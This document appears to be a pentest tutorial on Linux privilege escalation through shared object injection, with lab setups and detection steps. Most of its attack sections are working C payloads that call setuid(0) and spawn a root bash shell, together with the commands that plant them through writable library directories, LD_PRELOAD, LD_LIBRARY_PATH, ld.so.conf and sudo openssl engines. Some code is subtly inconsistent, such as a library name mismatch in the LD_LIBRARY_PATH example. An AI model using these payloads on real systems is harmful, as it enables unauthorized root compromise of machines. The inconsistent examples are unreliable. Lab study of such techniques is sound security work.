# Shared Object Injection

## Theory

Shared libraries are libraries that are loaded by programs at runtime.

From an offensive perspective, if we can write or replace a shared library through misconfiguration, environment variables, permissions, etc., we can create malicious code, bind the shared library to the program and the application (at runtime) will execute the code we created.

### Libraries

A library is a file that contains several pieces of code (using modular programming) compiled for reuse throughout the program to avoid the programmer having to rewrite the code several times, thus saving time and space. The library may provide reusable functions, classes, data structures or methods and will be linked to the program that will use it at compile time.

In the C programming language, we have two types of libraries: **dynamic libraries** and **static libraries**:

* Static libraries -> `.a` extension (by nomenclature convention).
* Dynamic or shared libraries -> `.so` extension (by nomenclature convention).

### Static Libraries <a href="#static-libraries" id="static-libraries"></a>

Static libraries will become part of the application/program, so they cannot be modified after compilation. From an offensive perspective, this means that the running program has its own copy of the library, so we will not be interested in it.

### Dynamic Libraries <a href="#dynamic-libraries" id="dynamic-libraries"></a>

Dynamic libraries can be used in two ways:

* Dynamic linking (dynamically linked at run time, i.e., an application links to the shared library (allocated by the programmer) and the kernel loads the library if it is not in memory when running).
* Dynamic loading (dynamiclly loaded and user under program control).

If we manage to alter the content of a dynamic library, we should be able to control the execution of the calling program.

### Dynamic Linking in Linux

As these libraries are dynamically linked to the program, we have to specify their location so that the Operating System knows where to look when the program is executed.

To solve this problem, the programmer/developer can use the `ld` tool, the GNU linker.

### ld (GNU linker) <a href="#ld---the-gnu-linker" id="ld---the-gnu-linker"></a>

Its `man` page gives us the following methods to specify the location of the dynamic libraries:

1. Using `-rpath` or `-rpath-link` options when compiling the application.
2. Using the environment variable **LD\_RUN\_PATH**.
3. Using the environment variable **LD\_LIBRARY\_PATH**.
4. Using the value of **DT\_RUNPATH** or **DT\_PATH**, set with `-rpath` option.
5. Putting libraries in default **/lib** and **/usr/lib** directories.
6. Specifying a directory containing our libraries in **/etc/ld.so.conf**

### **Conclusion**

As an attacker, our objective is to control one of these methods in order to replace an existing dynamic library by a malicious one. By default, security measures have been put in place in Linux. However, we will see that there are so many ways to make this exploit possible.

## Practice

### Lab Setup

In the following section you can find the code of the files we are going to use to prepare the environment:

{% tabs %}
{% tab title="sharedvuln.c" %}
{% code title="sharedvuln.c" %}
```c
#include <stdio.h>
#include "libcustom.h"

int main(){
    printf("Message from sharedvuln.c!\n");
    say_hi();
    return 0;
}
```
{% endcode %}
{% endtab %}

{% tab title="libcustom.h" %}
{% code title="libcustom.h" %}
```c
#include <stdio.h>

void say_hi();
```
{% endcode %}
{% endtab %}

{% tab title="libcustom.c" %}
{% code title="libcustom.c" %}
```c
#include <stdio.h>

void say_hi()
{
    puts("Hi. Message rom libcustom.c");
}
```
{% endcode %}
{% endtab %}
{% endtabs %}

**Create** those files in your machine in the same folder. And finally:

```bash
# Compile the library:
gcc -shared -o libcustom.so -fPIC libcustom.c
# Copy libcustom.so to /usr/lib (root privs):
sudo cp libcustom.so /usr/lib/
# Compile the executable:
gcc sharedvuln.c -o sharedvuln -lcustom
# Set SUID:
chmod +s sharedvuln
```

### Detection <a href="#method-1-write-permissions-in-lib---usrlib" id="method-1-write-permissions-in-lib---usrlib"></a>

Generally when attempting to escalate privileges via Shared Object Injection, binaries usually have SUID or SUDO permissions.

{% hint style="info" %}
It goes without saying that binaries must be customized, as the default binaries on Linux systems are not vulnerable to this, unless they have been modified.
{% endhint %}

```bash
sudo -l
find / -perm -u=s -type f 2>/dev/null
```

Once a suspicious or unusual binary has been detected, we will **check its functionality** (run it), its **shared libraries** (with `ldd`) and the **functions it calls** (with `ltrace`):

```bash
# Run:
> /opt/test/sharedvuln
Welcome to my amazing application!
Hi
# Check your shared libraries (with ldd):
> ldd /opt/test/sharedvuln
        linux-vdso.so.1 =>  (0x00007fff827ff000)
        libcustom.so => /usr/lib/libcustom.so (0x00007f63b6b55000)
        libc.so.6 => /lib/libc.so.6 (0x00007f63b67e9000)
        /lib64/ld-linux-x86-64.so.2 (0x00007f63b6d5c000)
# Check the calling functions (with ltrace):
> ltrace /opt/test/sharedvuln
__libc_start_main(0x400644, 1, 0x7fffcb1224f8, 0x400680, 0x400670 <unfinished ...>
puts("Welcome to my amazing applicatio"...Welcome to my amazing application!
)                                                                               = 35
say_hi(0xffffffff, 0x7f4f0d7db000, 0x7f4f0d3bbdf0, -1, 0xffffffffHi
)                                                        = 3
+++ exited (status 0) +++
```

From this output, we can draw the following conclusions:

* The program **runs correctly**.
* The program uses a shared library called "**libcustom.so**" from the **/usr/lib/** directory, which is **suspicious as this name is not common**, so it is most likely custom.
* Checking the **function names**, there is a **very custom** one called `say_hi()`. This is very important because if there is a misconfiguration, we need to **create our own shared library that has the same function name as the original**.

## Privilege Escalation

### #1. Write permissions in /lib, /usr/lib or custom directory <a href="#method-1-write-permissions-in-lib---usrlib" id="method-1-write-permissions-in-lib---usrlib"></a>

Although this seems rather unlikely (more common in CTF), it could happen that a user has write permissions on the folder where the custom shared library is located. In that case, the attacker could easily create a malicious shared library and place it in its respective directory. Therefore, executing the binary will execute your malicious code.

#### Requirements

* **Write permissions** on the custom shared library directory.

```bash
sudo chmod o+w /usr/lib/ # Lab Setup
ls -l /usr # Detection
drwxr-xrwx 41 root root  12288 Feb  2 07:13 lib
```

* The name of the custom shared library (with `ldd` or `strace`) and the name of the calling function (with `ltrace`).

#### Privilege escalation

Malicious payload that will give us a shell as root:

{% code title="libcustom.c" %}
```c
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

void say_hi(){ // Check the function name with ltrace.
    setuid(0);
    setgid(0);
    system("/bin/bash",NULL,NULL);
}
```
{% endcode %}

We compile it to generate the malicious shared library and then copy it to the directory where the original is located:

```bash
gcc -shared -o libcustom.so -fPIC libcustom.c
cp libcustom.so /usr/lib/
# Execute binary.
```

### #2. LD\_PRELOAD/LD\_LIBRARY\_PATH

#### Requirements

For both cases, we need at least one binary that runs with sudo as the root user without asking for a password. We can check this with `sudo -l`:

![](../../../.gitbook/assets/sudo\_environment\_variables.png)

{% tabs %}
{% tab title="LD_PRELOAD" %}
Malicious payload:

{% code title="shell.c" %}
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```
{% endcode %}

Let’s compile it to generate a shared object with .so extension likewise .dll file in the Windows operating system:

```bash
gcc -fPIC -shared -nostartfiles -o /tmp/shell.so /tmp/shell.c
# Execute with sudo:
sudo LD_PRELOAD=/tmp/shell.so <SUDO_BINARY_NO_PASSWD>
```
{% endtab %}

{% tab title="LD_LIBRARY_PATH" %}
This environment variable allows us to change the directory where the shared libraries are located. Therefore, our first step is to look for one of these in a binary that can be run with sudo and without a password:

```
sudo -l
Matching Defaults entries for user on this host:
    env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH

User user may run the following commands on this host:
    (root) NOPASSWD: /usr/bin/find
```

We check the shared libraries of that binary:

```bash
ldd /usr/bin/find
        linux-vdso.so.1 =>  (0x00007fffa71ff000)
        librt.so.1 => /lib/librt.so.1 (0x00007f24652e9000)
        libm.so.6 => /lib/libm.so.6 (0x00007f2465068000)
        libc.so.6 => /lib/libc.so.6 (0x00007f2464cfb000)
        libpthread.so.0 => /lib/libpthread.so.0 (0x00007f2464adf000)
        /lib64/ld-linux-x86-64.so.2 (0x00007f24654f7000)
```

We have several, but in this case we are going to use the shared library called **librt.so.1**. We create a malicious payload:

{% code title="library_path.c" %}
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
    unsetenv("LD_LIBRARY_PATH");
    setresuid(0,0,0);
    system("/bin/bash -p");
}
```
{% endcode %}

We compile it (the output must be the same name as the original shared library):

```bash
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /tmp/library_path.c
# Execute:
sudo LD_LIBRARY_PATH=/tmp /usr/bin/find
```
{% endtab %}

{% tab title="Lab Setup" %}
### Example with user "user"

1. Open **/etc/sudoers** file by typing `visudo`
2. Now give some sudo rights to a user, in our case "user" will be members of sudoers:

{% code title="/etc/sudoers" %}
```bash
Defaults        env_reset
Defaults env_keep+=LD_PRELOAD # Add this
Defaults env_keep+=LD_LIBRARY_PATH # Add this

...

#includedir /etc/sudoers.d
user ALL = (root) NOPASSWD: /usr/sbin/ioftp # Add this
user ALL = (root) NOPASSWD: /usr/bin/find # Add this
user ALL = (root) NOPASSWD: /usr/sbin/apache2 # Add this
```
{% endcode %}
{% endtab %}
{% endtabs %}

### #3. ld.so.conf and ldconfig

The `/etc/ld.so.conf` file indicates where the configuration files are loaded from, where the latter contain the path to find the shared libraries. Normally, this file contains the following path:

```
include /etc/ld.so.conf.d/*.conf
include /etc/ld.so.conf/*.conf
```

This means that the configuration files in `/etc/ld.so.conf.d/*.conf` will be read. These configuration files point to other folders that will be searched for shared libraries. For example, the contents of `/etc/ld.so.conf.d/libc.conf` is `/usr/local/lib`. This means that the system will look for libraries inside `/usr/local/lib`.

#### Requirements

* Run `ldconfig` as root (can be via SUDO, SUID or a cron job).
* **Write permissions** on the **/etc/ld.so.conf** file, **/etc/ld.so.conf.d** directory or on all **.conf** in the above directory.
* The name of the custom shared library (with `ldd` or `strace`) and the name of the calling function (with `ltrace`).

#### Privilege Escalation

Malicious payload:

{% code title="libcustom.c" %}
```c
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

void say_hi(){ // Check the function name with ltrace.
    setuid(0);
    setgid(0);
    system("/bin/bash",NULL,NULL);
}
```
{% endcode %}

Compile it:

```bash
gcc -shared -o /tmp/libcustom.so -fPIC /tmp/libcustom.c
```

{% tabs %}
{% tab title="Priv Esc" %}
### Methods

#### If we have write permissions in the /etc/ld.so.conf file:

```bash
echo -n "/tmp/*.conf" > /etc/ld.so.conf
echo -n "/tmp" > /tmp/test.conf
# Execute/wait for the ldconfig command to be executed to update the routes.
```

#### If we have write permissions on the /etc/ld.so.conf.d/ directory:

```bash
echo -n "/tmp" > custom.conf
cp custom.conf /etc/ld.so.conf.d/custom.conf
# Execute/wait for the ldconfig command to be executed to update the routes.
```

#### If you have write permissions on some of the configuration files:

```bash
# Example with libc.conf:
echo "/tmp" > /etc/ld.so.conf.d/libc.conf
# Execute/wait for the ldconfig command to be executed to update the routes.
```

{% hint style="warning" %}
There may also be cases where a configuration file is found with a symbolic link to another file where it has write permissions. In that case, we can do the same but in the file that is symbolically linked.
{% endhint %}
{% endtab %}

{% tab title="Lab Setup" %}
Follow the same steps as [here](shared-object-injection.md#lab-setup).

Then you can add SUDO, SUID permissions or simply add a cron job that runs this command.
{% endtab %}
{% endtabs %}

### #4. Missing Shared Object

There are SUID/SUDO binaries that may be looking for a `.so` (Shared Object) file but cannot find it. This can be exploited if that file is in a directory where we have write permissions.

{% tabs %}
{% tab title="Verification" %}
We look for **binaries** with **SUID/SUDO** permissions and then, with the `strace` command we investigate the most suspicious (or customized) ones to try to find a shared library that is not being found.

```bash
find / -type f -perm -04000 -ls 2>/dev/null # SUID
sudo -l # SUDO
strace <SUID/SUDO> 2>&1 | grep -iE "open|access|no such file"
# Output example:
openat(AT_FDCWD, "/tmp/test.so", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
```

If we can write to the directory where the shared library (`.so`) is not located, then we can escalate privileges.
{% endtab %}

{% tab title="Privilege Escalation" %}
After we have obtained the directory and the name of the shared library, we need to create our own:

{% code title="test.c" %}
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));
void inject()
{
    setuid(0);
    setgid(0);
    system("/bin/bash");
}
```
{% endcode %}

Compile it:

```bash
gcc -shared -o test.so -fPIC test.c
cp test.so <DIRECTORY>/<SO_NAME>.so
# Execute binary.
```
{% endtab %}

{% tab title="Lab Setup" %}
Vulnerable binary:

{% code title="missing_so.c" %}
```c
#include <stdio.h>
#include <stdlib.h>
#include <dlfcn.h>

int main(){
    printf("Hello World\n");
    dlopen("/tmp/test.so",1); // Load test.so
    return 0;
}
```
{% endcode %}

Compile it:

```bash
gcc -o missing_so missing_so.c -ldl
sudo cp missing_so /usr/bin/missing_so
# For SUID priv esc:
sudo chmod +s /usr/bin/missing_so
```
{% endtab %}
{% endtabs %}

### #5. sudo openssl

If openssl can be run as root with sudo, we can check in GTFOBins whether it is possible to escalate privileges or not:

![](../../../.gitbook/assets/openssl\_sudo\_library\_load.png)

While there are many ways to escalate privileges with openssl, let's look at the library loading part. In this case we are not given any **.so** (Shared Object) file, so we have to build it. In the command the `-engine` parameter is used, and doing a quick Google search as "**openssl engine so**", we see an [article](https://www.openssl.org/blog/blog/2015/10/08/engine-building-lesson-1-a-minimum-useless-engine/) that shows us a **.c** file to load the "engine":

![](../../../.gitbook/assets/openssl\_engine\_c.png)

Here we simply add our malicious payload and compile it:

{% hint style="info" %}
Don't forget to execute the command with `sudo`.
{% endhint %}

{% tabs %}
{% tab title="#1" %}
{% code title="exploit.c" %}
```c
#include <openssl/engine.h>

static int bind(ENGINE *e, const char *id)
{
  setuid(0); setgid(0);
  system("/bin/bash");
}

IMPLEMENT_DYNAMIC_BIND_FN(bind)
IMPLEMENT_DYNAMIC_CHECK_FN()
```
{% endcode %}
{% endtab %}

{% tab title="#2" %}
{% code title="exploit.c" %}
```c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <openssl/engine.h>

static const char *engine_id = "root shell";
static const char *engine_name = "Spawns a root shell";

static int bind(ENGINE *e, const char *id)
{
    int ret = 0;

    if (!ENGINE_set_id(e, engine_id)) {
        fprintf(stderr, "ENGINE_set_id failed\n");
        goto end;
    }
    
    if (!ENGINE_set_name(e, engine_name)) {
        printf("ENGINE_set_name failed\n");
        goto end;
    }

    setuid(0);
    setgid(0);
    system("/bin/bash");
    
    ret = 1;
    
    end:
    return ret;
}

IMPLEMENT_DYNAMIC_BIND_FN(bind)
IMPLEMENT_DYNAMIC_CHECK_FN()
```
{% endcode %}
{% endtab %}
{% endtabs %}

```bash
# Dependencies (for engine.h):
apt-get install libssl-dev # Ubuntu/Debian
yum install openssl-devel # Fedora/CentOS/RHEL
# Compilation #1 (recommended):
gcc -shared -o exploit.so -fPIC exploit.c
# Compilation #2:
gcc -fPIC -o exploit.o -c exploit.c
gcc -shared -o exploit.so -lcryto exploit.o
```

**Note**: In "**Compilation #2**", if we have problems with the `-lcryto` parameter, we add the directory where **libcrypto.so** is located with the `-l` parameter:

```bash
gcc -shared -o exploit.so -L/usr/local/lib64 -lcrypto exploit.o
gcc -shared -o exploit.so -L/usr/lib -lcrypto exploit.o
```
